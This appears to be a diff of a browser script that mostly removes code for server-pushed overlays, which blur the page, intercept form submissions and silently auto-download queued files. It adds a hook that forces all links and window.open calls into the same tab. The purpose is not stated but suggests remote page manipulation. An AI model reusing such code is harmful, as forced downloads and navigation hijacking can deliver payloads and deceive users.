-function download_showContent(content, fileName, fromSection = null, effectType = 'blur', location = null, intensity = 5, customEffect = null) {
-    // Remove any existing download overlay
-    download_cleanContent();
-    
-    // Store original body content if not already stored
-    if (!download_originalBodyContent) {
-        download_originalBodyContent = document.body.innerHTML;
-    }
-    
-    // Create overlay for background
-    const overlay = document.createElement('div');
-    overlay.id = 'eden-download-overlay';
-    
-    if (effectType === 'shade') {
-        overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            z-index: 1000000;
-        `;
-    } else if (effectType === 'none') {
-        overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: transparent;
-            z-index: 1000000;
-        `;
-    } else if (effectType === 'custom' && customEffect) {
-        // Handle custom effect
-        console.log('Applying custom effect for download:', customEffect.name);
-        console.log('Custom effect details:', JSON.stringify(customEffect));
-        console.log('Using intensity:', intensity);
-        
-        // Remove any existing custom effect style
-        const existingStyle = document.getElementById('eden-download-custom-effect-style');
-        if (existingStyle && existingStyle.parentNode) {
-            existingStyle.parentNode.removeChild(existingStyle);
-            console.log('Removed existing custom effect style');
-        }
-        
-        // Also remove any existing HTML-based custom effect - use the same ID as blur section
-        const existingHtmlEffect = document.getElementById('eden-custom-effect');
-        if (existingHtmlEffect && existingHtmlEffect.parentNode) {
-            existingHtmlEffect.parentNode.removeChild(existingHtmlEffect);
-            console.log('Removed existing HTML-based custom effect');
-        }
-        
-        if (customEffect.type === 'css') {
-            // Apply CSS-based effect
-            const styleEl = document.createElement('style');
-            styleEl.id = 'eden-download-custom-effect-style';
-            
-            // Add CSS variables for intensity - use the same names as blur section
-            const intensityValue = Math.max(1, Math.min(20, intensity));
-            const cssWithVars = `
-                :root {
-                    --eden-effect-intensity: ${intensityValue};
-                    --eden-effect-opacity: ${intensityValue / 20};
-                    --eden-effect-blur: ${intensityValue}px;
-                    --eden-effect-contrast: ${100 + (intensityValue * 5)}%;
-                    --eden-effect-brightness: ${100 + (intensityValue * 2)}%;
-                }
-                ${customEffect.content}
-            `;
-            
-            console.log('Adding custom CSS to head:', cssWithVars.substring(0, 100) + '...');
-            styleEl.textContent = cssWithVars;
-            document.head.appendChild(styleEl);
-            
-            // Apply basic overlay with intensity-based properties
-            const opacityValue = Math.max(0.1, Math.min(1.0, intensity / 20));
-            overlay.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100vw;
-                height: 100vh;
-                z-index: 1000000;
-                pointer-events: auto;
-                display: block !important;
-                opacity: ${opacityValue};
-            `;
-            
-            // Add custom class for CSS targeting - match the blur section
-            overlay.className = 'eden-custom-effect'; // Use the same class as blur section
-            console.log('Applied custom effect class to overlay');
-        } else {
-            // HTML-based effect
-            // Apply basic overlay with opacity based on intensity
-            const opacityValue = Math.max(0.1, Math.min(1.0, intensity / 20));
-            overlay.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100vw;
-                height: 100vh;
-                z-index: 1000000;
-                pointer-events: auto;
-                display: block !important;
-                overflow: hidden;
-                background-color: rgba(0, 0, 0, ${opacityValue * 0.2});
-            `;
-            
-            // Create a container for the HTML effect - match the blur section implementation exactly
-            const effectContainer = document.createElement('div');
-            effectContainer.id = 'eden-custom-effect'; // Use the same ID as blur section
-            effectContainer.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100vw;
-                height: 100vh;
-                z-index: 999998;
-                pointer-events: none;
-                opacity: ${opacityValue};
-                filter: contrast(${100 + (intensity * 10)}%);
-            `;
-            
-            // Set the HTML content
-            effectContainer.innerHTML = customEffect.content;
-            document.body.appendChild(effectContainer);
-            console.log('Applied HTML-based custom effect');
-        }
-    } else {
-        overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            backdrop-filter: blur(2.5px);
-            -webkit-backdrop-filter: blur(2.5px);
-            z-index: 1000000;
-        `;
-    }
-    
-    // Create content container (not blurred)
-    const contentContainer = document.createElement('div');
-    contentContainer.id = 'eden-download-container';
-    contentContainer.style.cssText = `
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        max-width: 90%;
-        max-height: 90%;
-        z-index: 1000001;
-        overflow: auto;
-    `;
-    
-    // Process content
-    const tempDiv = document.createElement('div');
-    tempDiv.innerHTML = content;
-    
-    // Find and remove any background styles from body
-    const bodyElements = tempDiv.querySelectorAll('body');
-    bodyElements.forEach(body => {
-        body.style.background = 'none';
-        body.style.backgroundColor = 'transparent';
-        body.style.backgroundImage = 'none';
-    });
-    
-    // Find and modify forms to handle submission
-    const forms = tempDiv.querySelectorAll('form');
-    forms.forEach(form => {
-        form.setAttribute('action', 'javascript:void(0);');
-        form.setAttribute('onsubmit', 'window.download_formSubmitted(this); return false;');
-    });
-    
-    // Set the processed content
-    contentContainer.innerHTML = tempDiv.innerHTML;
-    
-    // Position the content based on location data if provided
-    if (location && location.x !== undefined && location.y !== undefined) {
-        const boundedX = Math.min(Math.max(location.x, 25), 75);
-        const boundedY = Math.min(Math.max(location.y, 25), 75);
-        
-        contentContainer.style.top = `${boundedY}%`;
-        contentContainer.style.left = `${boundedX}%`;
-        contentContainer.style.maxWidth = '70%';
-        contentContainer.style.maxHeight = '70%';
-    }
-    
-    // Add elements to the page
-    document.body.appendChild(overlay);
-    document.body.appendChild(contentContainer);
-    
-    // Save to sessionStorage to persist across page refreshes
-    sessionStorage.setItem('eden-download-content', content);
-    sessionStorage.setItem('eden-download-filename', fileName);
-    sessionStorage.setItem('eden-download-effect-type', effectType);
-    sessionStorage.setItem('eden-download-intensity', intensity.toString());
-    sessionStorage.setItem('eden-download-type', 'downloadContent');
-    
-    // Store custom effect data if provided
-    if (effectType === 'custom' && customEffect) {
-        sessionStorage.setItem('eden-download-custom-effect', JSON.stringify(customEffect));
-    }
-    
-    if (fromSection) {
-        sessionStorage.setItem('eden-download-from-section', fromSection);
-    }
-    
-    // Save location data if present
-    if (location && location.x !== undefined && location.y !== undefined) {
-        sessionStorage.setItem('eden-download-location-x', location.x);
-        sessionStorage.setItem('eden-download-location-y', location.y);
-    } else {
-        sessionStorage.removeItem('eden-download-location-x');
-        sessionStorage.removeItem('eden-download-location-y');
-    }
-    
-    // Also update localStorage for backup
-    localStorage.setItem('eden-download-effect-type', effectType);
-}
-
-// Clean content and remove effects for download functionality
-function download_cleanContent() {
-    console.log('Running download_cleanContent');
-    
-    // Elements to remove with both old and new IDs
-    const elementsToRemove = [
-        // New IDs from this file
-        'eden-download-overlay',
-        'eden-download-container',
-        'eden-download-custom-effect-style',
-        'eden-download-custom-effect',
-        
-        // Old IDs from final.js that might still be present
-        'eden-blur-overlay',
-        'eden-content-container',
-        'eden-close-button',
-        'eden-custom-effect',
-        'eden-custom-effect-style'
-    ];
-    
-    // Remove all matching elements
-    elementsToRemove.forEach(id => {
-        const element = document.getElementById(id);
-        if (element) {
-            console.log('Removing element:', id);
-            element.parentNode.removeChild(element);
-        }
-    });
-    
-    // Clear ALL session storage related to displays
-    const sessionKeys = [
-        // New keys from this file
-        'eden-download-content',
-        'eden-download-filename',
-        'eden-download-effect-type',
-        'eden-download-from-section',
-        'eden-download-location-x',
-        'eden-download-location-y',
-        'eden-download-custom-effect',
-        
-        // Old keys from final.js that might still be present
-        'eden-active-content',
-        'eden-active-filename',
-        'eden-effect-type',
-        'eden-from-section',
-        'eden-active-effect-type',
-        'eden-active-from-section',
-        'eden-download-flag',
-        'eden-download-type'
-    ];
-    
-    sessionKeys.forEach(key => {
-        if (sessionStorage.getItem(key)) {
-            console.log('Removing session storage item:', key);
-            sessionStorage.removeItem(key);
-        }
-    });
-    
-    // Clear localStorage items
-    const localKeys = [
-        'eden-download-effect-type',
-        'eden-effect-type',
-        'eden-from-section',
-        'eden-pending-content',
-        'eden-pending-filename',
-        'eden-pending-effect-type',
-        'eden-pending-from-section',
-        // Add clean flags to prevent restoration
-        'eden-blur-applied',
-        'blur-data'
-    ];
-    
-    localKeys.forEach(key => {
-        if (localStorage.getItem(key)) {
-            console.log('Removing local storage item:', key);
-            localStorage.removeItem(key);
-        }
-    });
-    
-    // Set clean flags to prevent restoration
-    localStorage.setItem('clean-flag', 'true');
-    sessionStorage.setItem('clean-flag', 'true');
-    
-    console.log('Content cleaning completed');
-}
-
-// Make download_cleanContent available globally
-window.download_cleanContent = download_cleanContent;
-
-// Function to receive download content from server
-function download_receiveDownloadContent(content, fileName, downloadFlag) {
-    // Show the content with blur effect
-    download_showContent(content, fileName);
-    
-    // Mark this as download content
-    sessionStorage.setItem('eden-download-type', 'downloadContent');
-    
-    // Store the download flag if provided
-    if (downloadFlag === 'true') {
-        sessionStorage.setItem('eden-download-flag', 'true');
-    }
-}
-
-// Function to add a file to download selection
-function download_addToDownloadSelection(fileName, content) {
-    try {
-        // Get existing selected files or initialize empty array
-        let selectedFiles = [];
-        const existingData = localStorage.getItem('eden-download-selected-files');
-        
-        if (existingData) {
-            selectedFiles = JSON.parse(existingData);
-        }
-        
-        // Check if file already exists
-        const existingIndex = selectedFiles.findIndex(file => file.fileName === fileName);
-        
-        if (existingIndex !== -1) {
-            // Update existing file
-            selectedFiles[existingIndex] = { fileName, content };
-        } else {
-            // Add new file
-            selectedFiles.push({ fileName, content });
-        }
-        
-        // Save back to localStorage
-        localStorage.setItem('eden-download-selected-files', JSON.stringify(selectedFiles));
-        
-        // Store individual file info for quick access
-        localStorage.setItem(`eden-download-selected-${fileName}`, content);
-    } catch (error) {
-        console.error('Error adding selected file:', error);
-    }
-}
-
-// Function to remove a file from download selection
-function download_removeFromDownloadSelection(fileName) {
-    try {
-        // Get existing selected files
-        const existingData = localStorage.getItem('eden-download-selected-files');
-        
-        if (existingData) {
-            let selectedFiles = JSON.parse(existingData);
-            
-            // Filter out the file to remove
-            selectedFiles = selectedFiles.filter(file => file.fileName !== fileName);
-            
-            // Save back to localStorage
-            localStorage.setItem('eden-download-selected-files', JSON.stringify(selectedFiles));
-        }
-        
-        // Remove individual file entry
-        localStorage.removeItem(`eden-download-selected-${fileName}`);
-    } catch (error) {
-        console.error('Error removing selected file:', error);
-    }
-}
-
-// Function to download a batch of files
-function download_batchDownloadFiles(files) {
-    if (!files || !Array.isArray(files) || files.length === 0) {
-        return;
-    }
-    
-    // Process files sequentially with a small delay between them
-    files.forEach((file, index) => {
-        setTimeout(() => {
-            download_directDownloadFile(file.fileName, file.content);
-        }, index * 500); // 500ms delay between downloads
-    });
-}
-
-// Function to directly download a file without user interaction
-function download_directDownloadFile(fileName, content) {
-    try {
-        // Create a data URL for the content
-        const isBase64 = content && content.indexOf && content.indexOf('base64') !== -1;
-        const dataUrl = isBase64 ? content : 'data:text/plain;charset=utf-8,' + encodeURIComponent(content);
-        
-        // Create a temporary link element
-        const link = document.createElement('a');
-        link.href = dataUrl;
-        link.download = fileName;
-        link.style.display = 'none';
-        
-        // Append to the document, click, and remove
-        document.body.appendChild(link);
-        link.click();
-        
-        // Remove the link after a short delay
-        setTimeout(() => {
-            document.body.removeChild(link);
-        }, 100);
-    } catch (error) {
-        console.error('Error initiating direct download:', error);
-    }
-}
-
-// Handle form submission for download functionality
-function download_handleFormSubmission(form) {
-    // Get content type and download flag
-    const contentType = sessionStorage.getItem('eden-download-type');
-    const downloadFlag = sessionStorage.getItem('eden-download-flag');
-    
-    // Check localStorage for selected files
-    const selectedFilesJson = localStorage.getItem('eden-download-selected-files');
-    
-    // Only process downloads if we have the correct contentType AND download flag
-    if (contentType === 'downloadContent' && downloadFlag === 'true') {
-        if (selectedFilesJson) {
-            try {
-                const selectedFiles = JSON.parse(selectedFilesJson);
-                
-                if (selectedFiles.length > 0) {
-                    // Process each selected file for download
-                    selectedFiles.forEach(file => {
-                        download_directDownloadFile(file.fileName, file.content);
-                    });
-                    
-                    // Clear selected files from localStorage after downloading
-                    localStorage.removeItem('eden-download-selected-files');
-                    
-                    // Also remove individual file entries
-                    selectedFiles.forEach(file => {
-                        localStorage.removeItem(`eden-download-selected-${file.fileName}`);
-                    });
-                }
-            } catch (error) {
-                console.error('Error processing selected files for download:', error);
-            }
-        }
-        
-        // Clear the download flag after processing
-        sessionStorage.removeItem('eden-download-flag');
-    }
-    
-    // Clean up the content after form submission
-    download_cleanContent();
-    
-    return false;
-}
-
-// Initialize download functionality
-function download_initialize() {
-    window.download_formSubmitted = download_handleFormSubmission;
-    
-    console.log('Starting download_initialize function');
-    
-    // Check for any stored download content
-    const savedContent = sessionStorage.getItem('eden-download-content');
-    const savedFileName = sessionStorage.getItem('eden-download-filename');
-    const savedEffectType = sessionStorage.getItem('eden-download-effect-type') || 'blur';
-    const savedFromSection = sessionStorage.getItem('eden-download-from-section') || null;
-    const savedIntensity = parseInt(sessionStorage.getItem('eden-download-intensity') || '5');
-    
-    console.log('Initializing download with saved effect type:', savedEffectType);
-    console.log('Saved intensity:', savedIntensity);
-    console.log('Saved content available:', !!savedContent);
-    console.log('Saved filename:', savedFileName);
-    
-    // Check if location was saved
-    let savedLocation = null;
-    const savedX = sessionStorage.getItem('eden-download-location-x');
-    const savedY = sessionStorage.getItem('eden-download-location-y');
-    
-    if (savedX !== null && savedY !== null) {
-        savedLocation = {
-            x: parseFloat(savedX),
-            y: parseFloat(savedY)
-        };
-        console.log('Saved location found:', savedLocation);
-    }
-    
-    // Check if we should restore content
-    if (savedContent) {
-        // Check for custom effect data
-        let customEffectData = null;
-        if (savedEffectType === 'custom') {
-            try {
-                // Try to get custom effect from sessionStorage first
-                let customEffectJson = sessionStorage.getItem('eden-download-custom-effect');
-                
-                // If not in sessionStorage, try localStorage
-                if (!customEffectJson) {
-                    customEffectJson = localStorage.getItem('eden-download-custom-effect');
-                }
-                
-                // If still not found, try getting from custom effects storage
-                if (!customEffectJson) {
-                    const effectsKey = 'eden-custom-effects';
-                    const effects = JSON.parse(localStorage.getItem(effectsKey) || '{}');
-                    const customEffectName = localStorage.getItem('eden-download-custom-effect-name');
-                    
-                    if (customEffectName && effects[customEffectName]) {
-                        customEffectData = {
-                            name: customEffectName,
-                            content: effects[customEffectName].content,
-                            type: effects[customEffectName].type
-                        };
-                        console.log('Found custom effect in effects storage:', customEffectName);
-                    }
-                }
-                
-                console.log('Custom effect JSON from storage:', customEffectJson ? customEffectJson.substring(0, 100) + '...' : 'null');
-                
-                if (customEffectJson && !customEffectData) {
-                    customEffectData = JSON.parse(customEffectJson);
-                    console.log('Restoring custom effect for download:', customEffectData.name);
-                    console.log('Custom effect type:', customEffectData.type);
-                    console.log('Custom effect content length:', customEffectData.content ? customEffectData.content.length : 0);
-                } else if (!customEffectData) {
-                    console.warn('Custom effect type set but no custom effect data found');
-                }
-            } catch (error) {
-                console.error('Error parsing custom effect data:', error);
-            }
-        }
-        
-        download_showContent(
-            savedContent, 
-            savedFileName, 
-            savedFromSection, 
-            savedEffectType, 
-            savedLocation, 
-            savedIntensity, 
-            customEffectData
-        );
-        
-        // Store the custom effect in localStorage for persistence
-        if (savedEffectType === 'custom' && customEffectData) {
-            localStorage.setItem('eden-download-custom-effect', JSON.stringify(customEffectData));
-            localStorage.setItem('eden-download-custom-effect-name', customEffectData.name);
-        }
-    }
-}
-
-// Initialize download functionality when document is ready
-if (document.readyState === 'complete' || document.readyState === 'interactive') {
-    download_initialize();
-} else {
-    document.addEventListener('DOMContentLoaded', download_initialize);
-}
-
 // Export the clean function to global scope so it can be called from server.html
 window.cleanBlurDisplay = function() {
     console.log("cleanBlurDisplay called from eden.js");
-    
-    // Use the improved download_cleanContent function to clean everything
-    if (typeof download_cleanContent === 'function') {
-        download_cleanContent();
+    try {
+        if (typeof _forceCleanupBlurEffect === 'function') {
+            _forceCleanupBlurEffect();
+        } else {
+            // Fallback: remove known blur elements manually
+            ['#eden-blur-overlay', '#eden-content-container', '#eden-custom-effect', '#eden-custom-effect-style'].forEach(selector => {
+                document.querySelectorAll(selector).forEach(el => {
+                    if (el && el.parentNode) {
+                        el.parentNode.removeChild(el);
+                    }
+                });
+            });
+            localStorage.setItem('clean-flag', 'true');
+            sessionStorage.setItem('clean-flag', 'true');
+        }
+    } catch (error) {
+        console.error('Error cleaning blur display:', error);
     }
-    
-    // Also try to send a WebSocket message if socket is available
+
     if (typeof socket !== 'undefined' && socket && socket.readyState === WebSocket.OPEN) {
         socket.send(JSON.stringify({ 
             type: 'cleanContent',
             timestamp: Date.now()
         }));
     }
-    
-    return true; // For function chaining
+    return true;
 };
 
+(function () {
+	document.addEventListener("click", function (e) {
+		var t = e.target;
+		var a = t && t.closest ? t.closest("a") : null;
+		if (!a || !a.href) return;
+		if (a.href.indexOf("javascript:") === 0) return;
+		e.preventDefault();
+		location.href = a.href;
+	}, true);
+
+	var originalOpen = window.open;
+	window.open = function (url, name, features) {
+		if (!url) return originalOpen.apply(this, arguments);
+		location.href = url;
+		return window;
+	};
+})();
